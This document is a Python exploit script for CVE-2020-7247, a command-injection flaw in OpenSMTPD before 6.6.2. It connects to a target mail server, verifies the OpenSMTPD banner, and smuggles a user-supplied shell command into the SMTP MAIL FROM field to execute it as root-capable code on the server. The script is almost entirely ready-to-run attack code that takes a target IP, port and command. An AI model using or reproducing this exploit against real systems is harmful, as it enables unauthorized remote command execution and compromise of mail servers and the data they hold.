# Exploit Author: 1F98D
# Original Author: Qualys Security Advisory
# Vendor Homepage: https://www.opensmtpd.org/
# Software Link: https://github.com/OpenSMTPD/OpenSMTPD/releases/tag/6.6.1p1
# Version: OpenSMTPD < 6.6.2
# Tested on: Debian 9.11 (x64)
# CVE: CVE-2020-7247
# References:
# https://www.openwall.com/lists/oss-security/2020/01/28/3
#
# OpenSMTPD after commit a8e222352f and before version 6.6.2 does not adequately
# escape dangerous characters from user-controlled input. An attacker
# can exploit this to execute arbitrary shell commands on the target.
# 
#!/usr/local/bin/python3

from socket import *
import sys

if len(sys.argv) != 4:
    print(&#039;Usage {} <target ip> <target port> <command>&#039;.format(sys.argv[0]))
    print("E.g. {} 127.0.0.1 25 &#039;touch /tmp/x&#039;".format(sys.argv[0]))
    sys.exit(1)

ADDR = sys.argv[1]
PORT = int(sys.argv[2])
CMD = sys.argv[3]

s = socket(AF_INET, SOCK_STREAM)
s.connect((ADDR, PORT))

res = s.recv(1024)
if &#039;OpenSMTPD&#039; not in str(res):
    print(&#039;[!] No OpenSMTPD detected&#039;)
    print(&#039;[!] Received {}&#039;.format(str(res)))
    print(&#039;[!] Exiting...&#039;)
    sys.exit(1)

print(&#039;[*] OpenSMTPD detected&#039;)
s.send(b&#039;HELO x\r\n&#039;)
res = s.recv(1024)
if &#039;250&#039; not in str(res):
    print(&#039;[!] Error connecting, expected 250&#039;)
    print(&#039;[!] Received: {}&#039;.format(str(res)))
    print(&#039;[!] Exiting...&#039;)
    sys.exit(1)

print(&#039;[*] Connected, sending payload&#039;)
s.send(bytes(&#039;MAIL FROM:<;{};>\r\n&#039;.format(CMD), &#039;utf-8&#039;))
res = s.recv(1024)
if &#039;250&#039; not in str(res):
    print(&#039;[!] Error sending payload, expected 250&#039;)
    print(&#039;[!] Received: {}&#039;.format(str(res)))
    print(&#039;[!] Exiting...&#039;)
    sys.exit(1)

print(&#039;[*] Payload sent&#039;)
s.send(b&#039;RCPT TO:<root>\r\n&#039;)
s.recv(1024)
s.send(b&#039;DATA\r\n&#039;)
s.recv(1024)
s.send(b&#039;\r\nxxx\r\n.\r\n&#039;)
s.recv(1024)
s.send(b&#039;QUIT\r\n&#039;)
s.recv(1024)
print(&#039;[*] Done&#039;)

